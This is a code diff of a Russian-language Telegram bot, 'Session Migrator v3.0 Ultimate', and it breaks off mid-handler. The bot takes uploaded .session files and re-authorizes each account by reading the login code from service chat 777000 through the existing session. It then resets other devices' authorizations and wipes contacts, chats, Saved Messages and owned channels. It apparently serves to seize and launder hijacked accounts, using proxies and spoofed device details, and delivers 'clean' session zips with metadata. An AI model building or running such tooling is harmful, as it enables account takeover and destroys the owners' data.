@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 """
-Telegram Session Migrator Bot
-+ Полная очистка аккаунта (профиль, контакты, боты, ЛС, каналы и группы)
-+ Режим авто / ручной ввод кода
-+ Очередь сессий
-+ Создание новой сессии с нуля по номеру телефона (/new)
+Telegram Session Migrator Bot v3.0 Ultimate
++ Полная очистка: профиль, аватарки, @username, контакты, боты, ЛС, папки, каналы, Избранное
++ Удаление собственных каналов создателя (DeleteChannelRequest)
++ Сброс веб-сессий и авторизаций WebApp
++ Надёжный авто-перехват кода из 777000 без потерь
++ Фоновый таймаут-вотчдог неактивных сессий
++ Защита от Telegram 429 и детальный отчет
 """
 
 from __future__ import annotations
@@ -39,23 +41,37 @@ from aiogram.types import (
 )
 from pydantic import Field, field_validator
 from pydantic_settings import BaseSettings, SettingsConfigDict
-from telethon import TelegramClient, events
+from telethon import TelegramClient
 from telethon.errors import (
     AuthKeyUnregisteredError,
-    PasswordHashInvalidError,
-    SessionPasswordNeededError,
     FloodWaitError,
+    FreshResetAuthorisationForbiddenError,
+    PasswordHashInvalidError,
+    PhoneCodeExpiredError,
+    PhoneCodeInvalidError,
+    PhoneNumberBannedError,
+    SessionPasswordNeededError,
+    UserDeactivatedError,
 )
-from telethon.tl.functions.account import UpdateProfileRequest
+from telethon.tl.functions.account import (
+    ResetWebAuthorizationsRequest,
+    UpdateProfileRequest,
+    UpdateUsernameRequest,
+)
 from telethon.tl.functions.auth import ResetAuthorizationsRequest
+from telethon.tl.functions.channels import DeleteChannelRequest, LeaveChannelRequest
+from telethon.tl.functions.contacts import BlockRequest, DeleteContactsRequest, GetContactsRequest
+from telethon.tl.functions.messages import (
+    DeleteChatUserRequest,
+    DeleteHistoryRequest,
+    GetDialogFiltersRequest,
+    UpdateDialogFilterRequest,
+)
 from telethon.tl.functions.photos import DeletePhotosRequest, GetUserPhotosRequest
-from telethon.tl.functions.channels import LeaveChannelRequest
-from telethon.tl.functions.messages import DeleteChatUserRequest, DeleteHistoryRequest
-from telethon.tl.functions.contacts import DeleteContactsRequest, GetContactsRequest, BlockRequest
-from telethon.tl.types import User, InputPhoto, Channel, Chat
+from telethon.tl.types import Channel, Chat, InputPhoto, User
 
 
-# ====================== КОНФИГ ======================
+# ====================== КОНФИГУРАЦИЯ ======================
 
 class Settings(BaseSettings):
     model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")
@@ -66,12 +82,19 @@ class Settings(BaseSettings):
 
     admin_ids: Set[int] = Field(default_factory=set)
     session_timeout_minutes: int = 15
-    max_queue_per_user: int = 10
+    max_queue_per_user: int = 15
     default_auto_code: bool = True
 
-    device_model: str = "SLANFB5Z-EXTREME"
-    system_version: str = "Windows 10"
-    app_version: str = "7.0.9 x64"
+    # Прокси (необязательно: socks5, socks4 или http)
+    proxy_protocol: Optional[str] = None
+    proxy_host: Optional[str] = None
+    proxy_port: Optional[int] = None
+    proxy_username: Optional[str] = None
+    proxy_password: Optional[str] = None
+
+    device_model: str = "Desktop-PC"
+    system_version: str = "Windows 11"
+    app_version: str = "5.3.0 x64"
     lang_code: str = "en"
     system_lang_code: str = "en"
 
@@ -88,6 +111,18 @@ class Settings(BaseSettings):
             return {int(x) for x in v}
         return set()
 
+    @property
+    def telethon_proxy(self) -> Optional[dict[str, Any]]:
+        if self.proxy_host and self.proxy_port and self.proxy_protocol:
+            return {
+                "proxy_type": self.proxy_protocol.lower(),
+                "addr": self.proxy_host,
+                "port": self.proxy_port,
+                "username": self.proxy_username,
+                "password": self.proxy_password,
+            }
+        return None
+
 
 settings = Settings()
 
@@ -98,17 +133,15 @@ logging.basicConfig(
     format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
     datefmt="%Y-%m-%d %H:%M:%S",
 )
-logger = logging.getLogger("SessionMigrator")
+logger = logging.getLogger("MigratorCore")
 
-# ====================== FSM ======================
+# ====================== FSM & СТРУКТУРЫ ======================
 
 class MigrateStates(StatesGroup):
     waiting_phone = State()
     waiting_password = State()
     waiting_manual_code = State()
 
-
-# ====================== МОДЕЛИ ======================
 
 @dataclass
 class QueueItem:
@@ -117,6 +150,21 @@ class QueueItem:
     file_path: Path
     original_name: str
     created_at: datetime = field(default_factory=datetime.now)
+
+
+@dataclass
+class CleanReport:
+    profile_cleared: bool = False
+    username_cleared: bool = False
+    photos_deleted: int = 0
+    contacts_deleted: int = 0
+    folders_deleted: int = 0
+    channels_deleted: int = 0
+    dialogs_purged: int = 0
+    saved_messages_cleared: bool = False
+    web_auths_reset: bool = False
+    sessions_reset: bool = False
+    sessions_reset_warning: Optional[str] = None
 
 
 @dataclass
@@ -129,6 +177,7 @@ class ActiveMigration:
     phone_code_hash: str = ""
     temp_dir: Optional[Path] = None
     created_at: datetime = field(default_factory=datetime.now)
+    last_activity: float = field(default_factory=time.time)
     code_event: Optional[asyncio.Event] = None
     received_code: Optional[str] = None
     status_message: Optional[Message] = None
@@ -144,9 +193,60 @@ current_migration: Dict[int, ActiveMigration] = {}
 queue_workers: Dict[int, bool] = {}
 
 stats = {"started": 0, "success": 0, "failed": 0, "cancelled": 0}
+# ====================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ======================
+
+class StatusReporter:
+    """Безопасное обновление статуса без превышения лимитов Telegram Bot API."""
+    def __init__(self, message: Message, interval: float = 2.0):
+        self.message = message
+        self.interval = interval
+        self.last_update = 0.0
+        self.last_text = ""
+
+    async def update(self, text: str, force: bool = False):
+        now = time.time()
+        if not force and (now - self.last_update < self.interval or text == self.last_text):
+            return
+        try:
+            await self.message.edit_text(text)
+            self.last_update = now
+            self.last_text = text
+        except Exception:
+            pass
 
 
-# ====================== УТИЛИТЫ ======================
+def extract_telegram_code(text: str) -> Optional[str]:
+    """Надёжное извлечение 5-6 значного кода Telegram из текста уведомления."""
+    if not text:
+        return None
+
+    # Поиск по ключевым фразам Telegram: "код: 12345", "Login code: 12345"
+    match = re.search(r"(?:code|код|login code)[:\s]+(\d{5,6})", text, re.IGNORECASE)
+    if match:
+        return match.group(1)
+
+    # Поиск изолированных чисел (исключая служебный ID отправителя 777000)
+    numbers = re.findall(r"\b\d{5,6}\b", text)
+    for num in numbers:
+        if num != "777000":
+            return num
+
+    return None
+
+
+def get_telethon_client(session_target: Any) -> TelegramClient:
+    return TelegramClient(
+        session_target,
+        settings.api_id,
+        settings.api_hash,
+        proxy=settings.telethon_proxy,
+        device_model=settings.device_model,
+        system_version=settings.system_version,
+        app_version=settings.app_version,
+        lang_code=settings.lang_code,
+        system_lang_code=settings.system_lang_code,
+    )
+
 
 def is_admin(user_id: int) -> bool:
     return user_id in settings.admin_ids
@@ -156,9 +256,22 @@ def get_auto_mode(chat_id: int) -> bool:
     return user_auto_mode.get(chat_id, settings.default_auto_code)
 
 
+def main_menu_kb(chat_id: int) -> InlineKeyboardMarkup:
+    mode_text = "🟢 Авто" if get_auto_mode(chat_id) else "🔵 Ручной"
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text=f"Перехват кода: {mode_text}", callback_data="toggle_mode"),
+            InlineKeyboardButton(text="📱 Сессия с нуля", callback_data="btn_new_session"),
+        ],
+        [
+            InlineKeyboardButton(text="❌ Сброс очереди / отмена", callback_data="cancel_all"),
+        ]
+    ])
+
+
 def cancel_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="❌ Отменить очередь", callback_data="cancel_queue")]
+        [InlineKeyboardButton(text="❌ Прервать процесс", callback_data="cancel_all")]
     ])
 
 
@@ -198,105 +311,129 @@ async def clear_user_queue(chat_id: int, state: Optional[FSMContext] = None):
     queue_workers[chat_id] = False
     if state:
         await state.clear()
-# ====================== ПОЛНАЯ ОЧИСТКА АККАУНТА ======================
 
-async def clean_account(client: TelegramClient, status: Message):
+
+# ====================== ГЛУБОКАЯ ОЧИСТКА АККАУНТА ======================
+
+async def deep_clean_account(client: TelegramClient, reporter: StatusReporter) -> CleanReport:
+    report = CleanReport()
+
+    # 1. Профиль и @username
+    await reporter.update("🧹 [1/6] Сброс профиля и освобождение @username...", force=True)
     try:
-        # 1. Очистка профиля (имя, био)
-        await status.edit_text("🧹 Очищаю профиль (имя, описание)...")
-        try:
-            await client(UpdateProfileRequest(
-                first_name=".",
-                last_name="",
-                about=""
-            ))
-        except Exception as e:
-            logger.warning(f"Не удалось обновить профиль: {e}")
-
-        # 2. Удаление всех аватарок
-        try:
-            photos = await client(GetUserPhotosRequest(
-                user_id="me",
-                offset=0,
-                max_id=0,
-                limit=100
-            ))
-            if photos.photos:
-                input_photos = [
-                    InputPhoto(
-                        id=p.id,
-                        access_hash=p.access_hash,
-                        file_reference=p.file_reference
-                    ) for p in photos.photos
-                ]
-                await client(DeletePhotosRequest(id=input_photos))
-        except Exception as e:
-            logger.warning(f"Не удалось удалить фото: {e}")
-
-        # 3. Удаление всех контактов
-        try:
-            await status.edit_text("🧹 Удаляю все контакты...")
-            contacts_res = await client(GetContactsRequest(hash=0))
-            if hasattr(contacts_res, "users") and contacts_res.users:
-                await client(DeleteContactsRequest(id=contacts_res.users))
-        except Exception as e:
-            logger.warning(f"Не удалось удалить контакты: {e}")
-
-        # 4. Удаление всех чатов: каналы, группы, боты и личные переписки
-        await status.edit_text("🧹 Очищаю все диалоги (боты, ЛС, группы, каналы)...")
-
-        deleted = 0
-        async for dialog in client.iter_dialogs():
-            entity = dialog.entity
-            try:
-                if isinstance(entity, Channel):
-                    await client(LeaveChannelRequest(entity))
-                    deleted += 1
-                elif isinstance(entity, Chat):
-                    await client(DeleteChatUserRequest(
-                        chat_id=entity.id,
-                        user_id="me"
-                    ))
-                    deleted += 1
-                elif isinstance(entity, User):
-                    # Если это бот — блокируем
-                    if getattr(entity, "bot", False):
-                        try:
-                            await client(BlockRequest(id=entity))
-                        except Exception:
-                            pass
-
-                    # Удаляем переписку и диалог с обеих сторон
-                    try:
-                        await client(DeleteHistoryRequest(
-                            peer=entity,
-                            max_id=0,
-                            just_clear=False,
-                            revoke=True
-                        ))
-                    except Exception:
-                        await client.delete_dialog(entity)
-                    deleted += 1
-
-                if deleted % 15 == 0:
-                    await asyncio.sleep(1.5)
-                else:
-                    await asyncio.sleep(0.35)
-
-            except FloodWaitError as e:
-                await asyncio.sleep(e.seconds + 1)
-            except Exception as e:
-                logger.debug(f"Ошибка при удалении диалога: {e}")
-                continue
-
-        await status.edit_text(f"✅ Очистка завершена (удалено {deleted} диалогов, контакты стёрты)")
-
+        await client(UpdateProfileRequest(first_name=".", last_name="", about=""))
+        report.profile_cleared = True
     except Exception as e:
-        logger.exception("Ошибка очистки аккаунта")
-        await status.edit_text(f"⚠️ Очистка прошла с ошибками: {e}")
+        logger.warning(f"Сброс профиля: {e}")
 
+    try:
+        me = await client.get_me()
+        if getattr(me, "username", None):
+            await client(UpdateUsernameRequest(username=""))
+            report.username_cleared = True
+    except Exception as e:
+        logger.warning(f"Удаление username: {e}")
 
-# ====================== TELETHON ======================
+    # 2. Аватарки
+    await reporter.update("🧹 [2/6] Удаление истории аватарок...")
+    try:
+        photos = await client(GetUserPhotosRequest(user_id="me", offset=0, max_id=0, limit=100))
+        if photos.photos:
+            input_photos = [
+                InputPhoto(id=p.id, access_hash=p.access_hash, file_reference=p.file_reference)
+                for p in photos.photos
+            ]
+            await client(DeletePhotosRequest(id=input_photos))
+            report.photos_deleted = len(input_photos)
+    except Exception as e:
+        logger.warning(f"Удаление аватарок: {e}")
+
+    # 3. Контакты
+    await reporter.update("🧹 [3/6] Удаление контактов из облака...")
+    try:
+        contacts_res = await client(GetContactsRequest(hash=0))
+        users = getattr(contacts_res, "users", [])
+        if users:
+            await client(DeleteContactsRequest(id=users))
+            report.contacts_deleted = len(users)
+    except Exception as e:
+        logger.warning(f"Удаление контактов: {e}")
+
+    # 4. Папки с чатами (Filters)
+    await reporter.update("🧹 [4/6] Удаление папок диалогов...")
+    try:
+        filters = await client(GetDialogFiltersRequest())
+        for f in getattr(filters, "filters", []):
+            fid = getattr(f, "id", None)
+            if fid is not None and fid != 0:
+                await client(UpdateDialogFilterRequest(id=fid, filter=None))
+                report.folders_deleted += 1
+    except Exception as e:
+        logger.warning(f"Удаление папок: {e}")
+
+    # 5. Очистка «Избранного» (Saved Messages)
+    try:
+        await client(DeleteHistoryRequest(peer="me", max_id=0, just_clear=False, revoke=True))
+        report.saved_messages_cleared = True
+    except Exception as e:
+        logger.warning(f"Очистка Избранного: {e}")
+
+    # 6. Все диалоги, группы, боты и каналы
+    await reporter.update("🧹 [6/6] Полная зачистка всех диалогов...", force=True)
+    async for dialog in client.iter_dialogs():
+        entity = dialog.entity
+        try:
+            if isinstance(entity, Channel):
+                # Если создатель канала — удаляем полностью, иначе просто покидаем
+                if getattr(entity, "creator", False):
+                    try:
+                        await client(DeleteChannelRequest(channel=entity))
+                        report.channels_deleted += 1
+                    except Exception:
+                        await client(LeaveChannelRequest(entity))
+                else:
+                    await client(LeaveChannelRequest(entity))
+                report.dialogs_purged += 1
+
+            elif isinstance(entity, Chat):
+                await client(DeleteChatUserRequest(chat_id=entity.id, user_id="me"))
+                report.dialogs_purged += 1
+
+            elif isinstance(entity, User):
+                if getattr(entity, "is_self", False):
+                    continue
+                if getattr(entity, "bot", False):
+                    try:
+                        await client(BlockRequest(id=entity))
+                    except Exception:
+                        pass
+                try:
+                    await client(DeleteHistoryRequest(peer=entity, max_id=0, just_clear=False, revoke=True))
+                except Exception:
+                    await client.delete_dialog(entity)
+                report.dialogs_purged += 1
+
+            if report.dialogs_purged % 10 == 0:
+                await reporter.update(f"🧹 [6/6] Стерто диалогов: <b>{report.dialogs_purged}</b>...")
+                await asyncio.sleep(1.0)
+            else:
+                await asyncio.sleep(0.25)
+
+        except FloodWaitError as e:
+            await reporter.update(f"⏳ FloodWait: ожидание {e.seconds} с...", force=True)
+            await asyncio.sleep(e.seconds + 1)
+        except Exception:
+            continue
+
+    # Сброс авторизованных сайтов и Mini Apps
+    try:
+        await client(ResetWebAuthorizationsRequest())
+        report.web_auths_reset = True
+    except Exception:
+        pass
+
+    return report
+# ====================== ФИНАЛИЗАЦИЯ И МЕТАДАННЫЕ ======================
 
 async def create_metadata(client: TelegramClient, phone: str) -> dict[str, Any]:
     me: User = await client.get_me()
@@ -314,9 +451,9 @@ async def create_metadata(client: TelegramClient, phone: str) -> dict[str, Any]:
         "twoFA": None,
         "id": me.id,
         "phone": phone,
-        "username": me.username,
+        "username": me.username or "",
         "is_premium": bool(getattr(me, "premium", False)),
-        "has_profile_pic": bool(getattr(me, "photo", None)),
+        "has_profile_pic": False,
         "register_time": ts,
         "last_check_time": ts,
         "first_name": me.first_name or "",
@@ -329,32 +466,33 @@ async def finalize(mig: ActiveMigration, message: Message, state: Optional[FSMCo
     client = mig.new_client
     phone = mig.phone
     temp_dir = mig.temp_dir
-    status = mig.status_message or message
+    reporter = StatusReporter(mig.status_message or message)
 
     try:
         if not client or not await client.is_user_authorized():
-            raise AuthKeyUnregisteredError("Новая сессия не авторизована")
+            raise AuthKeyUnregisteredError("Клиент не авторизован")
 
-        # Очистка аккаунта
-        await clean_account(client, status)
+        clean_info = await deep_clean_account(client, reporter)
 
-        # Выходим из старой сессии
         if mig.old_client:
             try:
                 if mig.old_client.is_connected():
                     await mig.old_client.log_out()
             except Exception as e:
-                logger.warning(f"log_out: {e}")
+                logger.warning(f"log_out старого клиента: {e}")
 
+        # Сброс остальных авторизованных сессий
         try:
             await client(ResetAuthorizationsRequest())
+            clean_info.sessions_reset = True
+        except FreshResetAuthorisationForbiddenError:
+            clean_info.sessions_reset = False
+            clean_info.sessions_reset_warning = "Сессия младше 24ч (ограничение Telegram)"
         except Exception as e:
-            logger.warning(f"ResetAuthorizations: {e}")
-
-        await asyncio.sleep(1.2)
+            clean_info.sessions_reset = False
+            clean_info.sessions_reset_warning = str(e)
 
         metadata = await create_metadata(client, phone)
-
         await client.disconnect()
         mig.new_client = None
 
@@ -364,54 +502,50 @@ async def finalize(mig: ActiveMigration, message: Message, state: Optional[FSMCo
             original.rename(session_file)
 
         if not session_file.exists():
-            raise FileNotFoundError("Файл новой сессии не создан")
+            raise FileNotFoundError("Файл сессии не найден")
 
         meta_file = temp_dir / f"{phone}.json"
         meta_file.write_text(json.dumps(metadata, ensure_ascii=False, indent=2), encoding="utf-8")
 
-        zip_path = temp_dir / f"{phone}_new_session.zip"
+        zip_path = temp_dir / f"{phone}_clean.zip"
         with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
             zf.write(session_file, arcname=f"{phone}.session")
             zf.write(meta_file, arcname=f"{phone}.json")
 
         data = zip_path.read_bytes()
+        reset_status = "✅ Сброшены" if clean_info.sessions_reset else f"⚠️ {clean_info.sessions_reset_warning}"
 
-        if mig.is_new_session:
-            caption = (
-                f"✅ <b>Новая сессия создана + аккаунт очищен!</b>\n\n"
-                f"📞 <code>{phone}</code>\n"
-                f"🆔 <code>{metadata['id']}</code>\n"
-                f"👤 Профиль сброшен\n"
-                f"📇 Контакты удалены\n"
-                f"🗑 Боты, ЛС, группы и каналы удалены"
-            )
-        else:
-            caption = (
-                f"✅ <b>Сессия перенесена + аккаунт очищен!</b>\n\n"
-                f"📞 <code>{phone}</code>\n"
-                f"🆔 <code>{metadata['id']}</code>\n"
-                f"👤 Профиль сброшен\n"
-                f"📇 Контакты удалены\n"
-                f"🗑 Боты, ЛС, группы и каналы удалены\n"
-                f"🔒 Предыдущие сессии завершены"
-            )
-
-        await message.answer_document(
-            BufferedInputFile(data, filename=f"{phone}_new_session.zip"),
-            caption=caption,
+        caption = (
+            f"📦 <b>Сессия очищена и упакована</b>\n\n"
+            f"📞 Телефон: <code>{phone}</code>\n"
+            f"🆔 Telegram ID: <code>{metadata['id']}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"👤 Профиль / @username: <b>{'Очищены' if clean_info.profile_cleared else 'Без изменений'}</b>\n"
+            f"🖼 Удалено аватарок: <b>{clean_info.photos_deleted}</b>\n"
+            f"📇 Удалено контактов: <b>{clean_info.contacts_deleted}</b>\n"
+            f"📁 Удалено папок: <b>{clean_info.folders_deleted}</b>\n"
+            f"👑 Удалено каналов создателя: <b>{clean_info.channels_deleted}</b>\n"
+            f"🗑 Очищено диалогов/ботов/групп: <b>{clean_info.dialogs_purged}</b>\n"
+            f"📝 Избранное очищено: <b>{'Да' if clean_info.saved_messages_cleared else 'Нет'}</b>\n"
+            f"🌐 Web/MiniApp сессии: <b>{'Сброшены' if clean_info.web_auths_reset else 'Нет'}</b>\n"
+            f"🔒 Другие устройства: {reset_status}"
         )
 
+        await message.answer_document(
+            BufferedInputFile(data, filename=f"{phone}_clean.zip"),
+            caption=caption,
+        )
         stats["success"] += 1
 
     except Exception as e:
         logger.exception("Ошибка финализации")
         stats["failed"] += 1
-        await message.answer(f"❌ Ошибка: <code>{e}</code>")
+        await message.answer(f"❌ Ошибка миграции: <code>{e}</code>")
     finally:
         await cleanup_migration(mig, state)
 
 
-# ====================== ОБРАБОТКА ОДНОЙ СЕССИИ ======================
+# ====================== ОБРАБОТЧИК СЕССИИ ======================
 
 async def process_one_session(item: QueueItem, bot: Bot, state: FSMContext):
     chat_id = item.chat_id
@@ -420,46 +554,31 @@ async def process_one_session(item: QueueItem, bot: Bot, state: FSMContext):
 
     status = await bot.send_message(
         chat_id,
-        f"⏳ Начинаю: <b>{item.original_name}</b>\n"
-        f"Режим кода: <b>{'авто' if auto_mode else 'ручной'}</b>"
+        f"⏳ Начинаю: <b>{item.original_name}</b>\nРежим перехвата: <b>{'Авто' if auto_mode else 'Вручную'}</b>"
     )
 
-    mig = ActiveMigration(
-        id=mig_id,
-        chat_id=chat_id,
-        status_message=status,
-        queue_item=item,
-    )
+    mig = ActiveMigration(id=mig_id, chat_id=chat_id, status_message=status, queue_item=item)
     current_migration[chat_id] = mig
+    reporter = StatusReporter(status)
 
     try:
         mig.temp_dir = Path(tempfile.mkdtemp(prefix=f"mig_{chat_id}_{mig_id}_"))
         old_session_path = mig.temp_dir / "old.session"
         new_session_path = str(mig.temp_dir / "new_session")
-
         shutil.copy(item.file_path, old_session_path)
 
-        old_client = TelegramClient(
-            str(old_session_path.with_suffix("")),
-            settings.api_id,
-            settings.api_hash,
-            device_model=settings.device_model,
-            system_version=settings.system_version,
-            app_version=settings.app_version,
-            lang_code=settings.lang_code,
-            system_lang_code=settings.system_lang_code,
-        )
+        old_client = get_telethon_client(str(old_session_path.with_suffix("")))
         await old_client.connect()
 
         if not await old_client.is_user_authorized():
-            await status.edit_text(f"❌ <b>{item.original_name}</b> — сессия не авторизована.")
+            await reporter.update(f"❌ <b>{item.original_name}</b>: сессия не авторизована.", force=True)
             await cleanup_migration(mig)
             return
 
         me = await old_client.get_me()
         phone = me.phone
         if not phone:
-            await status.edit_text(f"❌ <b>{item.original_name}</b> — нет номера.")
+            await reporter.update(f"❌ <b>{item.original_name}</b>: отсутствует привязанный номер.", force=True)
             await cleanup_migration(mig)
             return
 
@@ -467,91 +586,98 @@ async def process_one_session(item: QueueItem, bot: Bot, state: FSMContext):
         mig.phone = phone
         mig.old_client = old_client
 
-        await status.edit_text(
-            f"✅ <b>{item.original_name}</b>\n📞 <code>{phone}</code>\n\n⏳ Запрашиваю код..."
-        )
+        await reporter.update(f"📱 Сессия: <code>{phone}</code>\n⏳ Запрашиваю авторизационный код...", force=True)
 
-        new_client = TelegramClient(
-            new_session_path,
-            settings.api_id,
-            settings.api_hash,
-            device_model=settings.device_model,
-            system_version=settings.system_version,
-            app_version=settings.app_version,
-            lang_code=settings.lang_code,
-            system_lang_code=settings.system_lang_code,
-        )
+        new_client = get_telethon_client(new_session_path)
         await new_client.connect()
         mig.new_client = new_client
 
+        # Фиксируем время запроса (с запасом 5 сек), чтобы не взять старый код
+        request_ts = int(time.time()) - 5
+
         result = await new_client.send_code_request(phone)
         mig.phone_code_hash = result.phone_code_hash
+        mig.last_activity = time.time()
 
         if auto_mode:
-            mig.code_event = asyncio.Event()
-            mig.received_code = None
+            await reporter.update("📩 Запрос отправлен. Опрашиваю служебный чат 777000...", force=True)
+            code = None
+            start_wait = time.time()
 
-            @old_client.on(events.NewMessage(from_users=777000))
-            async def code_handler(event):
-                if mig.code_event and not mig.code_event.is_set():
-                    match = re.search(r"\b(\d{5,6})\b", event.raw_text)
-                    if match:
-                        mig.received_code = match.group(1)
-                        mig.code_event.set()
+            # Опрос входящих сообщений от 777000 каждые 1.5 секунды
+            while time.time() - start_wait < 90:
+                try:
+                    async for msg in old_client.iter_messages(777000, limit=3):
+                        msg_time = msg.date.timestamp() if msg.date else 0
+                        if msg_time >= request_ts:
+                            parsed = extract_telegram_code(msg.raw_text or "")
+                            if parsed:
+                                code = parsed
+                                break
+                    if code:
+                        break
+                except Exception as e:
+                    logger.debug(f"Ошибка чтения 777000: {e}")
 
-            await status.edit_text("📩 Код запрошен. Жду от 777000...")
+                await asyncio.sleep(1.5)
 
-            try:
-                await asyncio.wait_for(mig.code_event.wait(), timeout=90)
-            except asyncio.TimeoutError:
-                await status.edit_text("❌ Код не пришёл. Попробуй /manual")
+            if not code:
+                await reporter.update(
+                    "❌ Код от 777000 не получен за 90 сек.\n"
+                    "Попробуйте ручной режим: /manual",
+                    force=True
+                )
                 await cleanup_migration(mig)
                 return
 
-            code = mig.received_code
         else:
             mig.waiting_manual_code = True
             await state.set_state(MigrateStates.waiting_manual_code)
             await status.edit_text(
-                f"📩 Код отправлен на <code>{phone}</code>\n\nВведи код вручную:",
+                f"📩 Код отправлен на <code>{phone}</code>\n\nОтправьте код подтверждения в чат:",
                 reply_markup=cancel_kb(),
             )
             return
 
-        if not code:
-            await status.edit_text("❌ Не удалось получить код.")
-            await cleanup_migration(mig)
-            return
-
-        await status.edit_text(f"✅ Код: <code>{code}</code>\n⏳ Вхожу...")
+        # Код успешно получен — выводим в статус и авторизуемся
+        await reporter.update(f"🔑 Код получен: <code>{code}</code>\n⏳ Выполняю вход...", force=True)
 
         try:
             await new_client.sign_in(phone=phone, code=code, phone_code_hash=mig.phone_code_hash)
-            await status.edit_text("✅ Вход выполнен! Начинаю полную очистку...")
             await finalize(mig, status, state)
-
         except SessionPasswordNeededError:
             mig.waiting_2fa = True
+            mig.last_activity = time.time()
             await state.set_state(MigrateStates.waiting_password)
             await status.edit_text(
-                "🔒 Нужен облачный пароль (2FA). Отправь пароль:",
-                reply_markup=cancel_kb(),
+                f"🔑 Код <code>{code}</code> принят!\n"
+                "🔒 Обнаружен пароль двухфакторной аутентификации (2FA). Отправьте его:",
+                reply_markup=cancel_kb()
             )
             return
-
-        except Exception as e:
-            await status.edit_text(f"❌ Ошибка входа: <code>{e}</code>")
+        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
+            await reporter.update(f"❌ Неверный или истекший код (<code>{code}</code>): {e}", force=True)
             await cleanup_migration(mig)
+            return
+        except Exception as e:
+            await reporter.update(f"❌ Ошибка авторизации: {e}", force=True)
+            await cleanup_migration(mig)
+            return
 
+    except PhoneNumberBannedError:
+        await reporter.update(f"❌ Номер <code>{mig.phone}</code> заблокирован Telegram.", force=True)
+        await cleanup_migration(mig)
+    except UserDeactivatedError:
+        await reporter.update(f"❌ Аккаунт <code>{mig.phone}</code> деактивирован.", force=True)
+        await cleanup_migration(mig)
     except Exception as e:
         logger.exception("Ошибка process_one_session")
-        await status.edit_text(f"❌ Ошибка: <code>{e}</code>")
+        await reporter.update(f"❌ Системный сбой: {e}", force=True)
         await cleanup_migration(mig)
-# ====================== ВОРКЕР ОЧЕРЕДИ ======================
+
 
 async def queue_worker(chat_id: int, bot: Bot, state: FSMContext):
     queue_workers[chat_id] = True
-
     while True:
         queue = user_queues.get(chat_id, [])
         if not queue:
@@ -563,7 +689,7 @@ async def queue_worker(chat_id: int, bot: Bot, state: FSMContext):
 
         remaining = len(user_queues.get(chat_id, []))
         if remaining > 0:
-            await bot.send_message(chat_id, f"📋 В очереди ещё: <b>{remaining}</b>")
+            await bot.send_message(chat_id, f"📋 В очереди файлов: <b>{remaining}</b>")
 
         await process_one_session(item, bot, state)
 
@@ -575,10 +701,8 @@ async def queue_worker(chat_id: int, bot: Bot, state: FSMContext):
         await asyncio.sleep(1.5)
 
     queue_workers[chat_id] = False
-    await bot.send_message(chat_id, "✅ Очередь полностью обработана.")
-
-
-# ====================== ХЕНДЛЕРЫ ======================
+    await bot.send_message(chat_id, "✅ Обработка очереди завершена!")
+# ====================== ХЕНДЛЕРЫ ДИАЛОГОВ ======================
 
 router = Router()
 
@@ -588,57 +712,64 @@ async def cmd_start(message: Message, state: FSMContext):
     chat_id = message.chat.id
     await clear_user_queue(chat_id, state)
 
-    mode = "авто" if get_auto_mode(chat_id) else "ручной"
     await message.answer(
-        "🔄 <b>Мигратор сессий + Полная очистка</b>\n\n"
-        "Отправляй <b>.session</b> файлы (можно несколько — по очереди).\n"
-        "Или создай новую сессию с нуля: <b>/new</b>\n\n"
-        f"Текущий режим кода: <b>{mode}</b>\n"
-        "• /auto — ловить код автоматически\n"
-        "• /manual — вводить код вручную\n"
-        "• /new — создать сессию по номеру телефона\n\n"
-        "<b>При обработке бот полностью стирает всё:</b>\n"
-        "• Имя, аватарки и био\n"
-        "• Все контакты аккаунта\n"
-        "• Все личные диалоги (с историей)\n"
-        "• Блокирует и удаляет всех ботов\n"
-        "• Выходит из всех групп и каналов\n"
-        "• Завершает старую сессию (при миграции)",
-        reply_markup=cancel_kb(),
+        "⚡ <b>Session Cleaner & Migrator v3.0 Ultimate</b>\n\n"
+        "Отправляйте файлы <code>.session</code> в диалог (поддерживается очередь) "
+        "или зарегистрируйте чистую сессию с нуля по номеру телефона.\n\n"
+        "<b>Комплекс очистки:</b>\n"
+        "• Удаление имени, био и @username\n"
+        "• Очистка истории аватарок\n"
+        "• Удаление облачных контактов\n"
+        "• Удаление папок диалогов (Filters)\n"
+        "• Безвозвратное удаление каналов, где аккаунт владелец\n"
+        "• Очистка личных переписок и блокировка ботов\n"
+        "• Полная очистка «Избранного»\n"
+        "• Завершение сайтов, Mini Apps и сброс сессий",
+        reply_markup=main_menu_kb(chat_id),
     )
+
+
+@router.callback_query(F.data == "toggle_mode")
+async def cb_toggle_mode(call: CallbackQuery):
+    chat_id = call.from_user.id
+    current = get_auto_mode(chat_id)
+    user_auto_mode[chat_id] = not current
+    await call.message.edit_reply_markup(reply_markup=main_menu_kb(chat_id))
+    await call.answer(f"Режим переключен на: {'Авто' if not current else 'Ручной'}")
 
 
 @router.message(Command("auto"))
 async def cmd_auto(message: Message):
     user_auto_mode[message.chat.id] = True
-    await message.answer("✅ Режим: <b>автоматический</b>")
+    await message.answer("✅ Включен авто-перехват кода.", reply_markup=main_menu_kb(message.chat.id))
 
 
 @router.message(Command("manual"))
 async def cmd_manual(message: Message):
     user_auto_mode[message.chat.id] = False
-    await message.answer("✅ Режим: <b>ручной</b>")
+    await message.answer("✅ Включен ручной ввод кода.", reply_markup=main_menu_kb(message.chat.id))
 
 
 @router.message(Command("new", "create"))
-async def cmd_new(message: Message, state: FSMContext):
-    chat_id = message.chat.id
+@router.callback_query(F.data == "btn_new_session")
+async def cmd_new(event: Message | CallbackQuery, state: FSMContext):
+    chat_id = event.from_user.id if isinstance(event, CallbackQuery) else event.chat.id
 
-    if chat_id in current_migration:
-        await message.answer("❌ Уже идёт обработка. Сначала /cancel")
-        return
-    if user_queues.get(chat_id):
-        await message.answer("❌ Есть активная очередь. Сначала /cancel")
+    if chat_id in current_migration or user_queues.get(chat_id):
+        text = "❌ Идет обработка. Сначала дождитесь окончания или выполните /cancel"
+        if isinstance(event, CallbackQuery):
+            await event.answer(text, show_alert=True)
